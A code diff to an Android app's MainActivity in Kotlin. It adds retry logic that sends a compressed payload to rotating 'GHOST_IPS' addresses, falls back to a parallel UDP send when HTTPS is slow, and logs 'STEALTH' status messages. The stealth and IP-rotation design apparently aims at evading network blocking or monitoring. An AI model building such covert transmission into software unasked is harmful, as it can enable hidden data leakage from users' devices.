@@ -59,8 +59,8 @@ class MainActivity : ComponentActivity() {
     }
 
     private val client = OkHttpClient.Builder()
-        .connectTimeout(3, java.util.concurrent.TimeUnit.SECONDS)
-        .readTimeout(3, java.util.concurrent.TimeUnit.SECONDS)
+        .connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
+        .readTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
         .dns(object : Dns {
             override fun lookup(hostname: String): List<java.net.InetAddress> {
                 return try {
@@ -248,13 +248,30 @@ class MainActivity : ComponentActivity() {
                                     var attempt = 1
                                     val startTime = System.currentTimeMillis()
                                     
-                                    while (!success && attempt <= 5) {
-                                        activePhase = "HUNTING (ATMPT $attempt)"
+                                    while (!success && attempt <= 10) {
+                                        val currentTarget = GHOST_IPS[currentIpIndex]
+                                        activePhase = "HUNTING [$attempt/10] -> $currentTarget"
+                                        
+                                        // Secondary Parallel UDP Thread: Fire after 5s of HTTPS struggle
+                                        val udpJob = scope.launch(Dispatchers.IO) {
+                                            delay(5000)
+                                            if (!success) {
+                                                dLog("STEALTH: HTTPS SLOW - FIRING PARALLEL UDP")
+                                                sendGhostUdp(compressed, currentTarget)
+                                            }
+                                        }
+
                                         success = sendBurstSync(compressed, ::dLog)
+                                        udpJob.cancel()
+
                                         if (!success) {
                                             currentIpIndex = (currentIpIndex + 1) % GHOST_IPS.size
-                                            dLog("STEALTH: ROTATING TO IP ${GHOST_IPS[currentIpIndex]}")
-                                            kotlinx.coroutines.delay(2000L * attempt)
+                                            val waitTime = (attempt * 3).coerceAtMost(15)
+                                            dLog("STEALTH: COOLING DOWN (${waitTime}s)")
+                                            for (i in waitTime downTo 1) {
+                                                activePhase = "RECOVERY ($i s)"
+                                                delay(1000)
+                                            }
                                         }
                                         attempt++
                                     }
